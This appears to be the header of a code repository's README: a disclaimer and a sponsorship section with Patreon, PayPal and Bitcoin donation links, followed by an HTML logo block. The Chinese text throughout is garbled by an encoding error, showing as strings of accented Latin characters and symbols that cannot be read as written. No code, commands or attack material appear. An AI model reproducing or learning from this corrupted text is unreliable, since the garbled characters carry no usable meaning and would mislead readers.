> æœ¬ä»“åº“æ‰€æœ‰å†…å®¹å‡æ¥è‡ªäº’è”ç½‘å…¬å¼€å†…å®¹æˆ–æœ¬ä»“åº“æ‰€æœ‰è€…åˆ›ä½œï¼Œè¯·å‹¿ç›¸ä¿¡èµ„æºä¸­çš„å¹¿å‘Šï¼Œä¸»åŠ¨è”ç³»ä½ çš„éƒ½æ˜¯éª—å­ï¼Œæé«˜æ™ºå•†è°¨é˜²ä¸Šå½“å—è¯ˆï¼è¯·å‹¿åˆ©ç”¨æœ¬ä»“åº“å®æ–½è¿åä»»ä½•é€‚ç”¨æ³•å¾‹æ³•è§„ç­‰çŠ¯ç½ªæ´»åŠ¨ï¼æœ¬ä»“åº“æ‰€æœ‰è€…ä¸å¯¹å› ä½¿ç”¨æœ¬ä»“åº“å†…å®¹å¯¼è‡´çš„ä»»ä½•åæœæ‰¿æ‹…è´£ä»»ï¼

****

## ä½ çš„èµåŠ©æ˜¯åŠŸå¾·æ— é‡ğŸ’°

>  [!NOTE]
>
> å¦‚æœä½ è§‰å¾—æœ¬ä»“åº“å¯¹ä½ æœ‰å¸®åŠ©ï¼Œä½ å¯ä»¥èµåŠ©æˆ‘ä»¬ä¸€æ¯å’–å•¡ï¼Œé¼“åŠ±æˆ‘ä»¬ç»§ç»­ç»´æŠ¤ä¸‹å»ã€‚<br>
> æˆä¸ºæˆ‘çš„Patreonä¼šå‘˜ï¼šhttps://www.patreon.com/MeeGooBoo/membership<br>
> é€šè¿‡Paypalæ”¯æŒæˆ‘ï¼šhttps://paypal.me/MoGuoBiao<br>
> é€šè¿‡æ¯”ç‰¹å¸æ”¯æŒæˆ‘ï¼šbc1qkwrq5plek62fmfaynyphfuuepm6cxd4fsh5wrp



<p align="center" >
    <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/logo.png" width="150">
    <h3 align="center">ç‰›é©¬å°è¯•(è«å›½æ ‡)</h3>
    <p align="center">
        <img src="https://raw.githubusercontent.com/MeeGooBoo/2025/refs/heads/main/static/imgs/pays.png">
    </p>
</p>


****


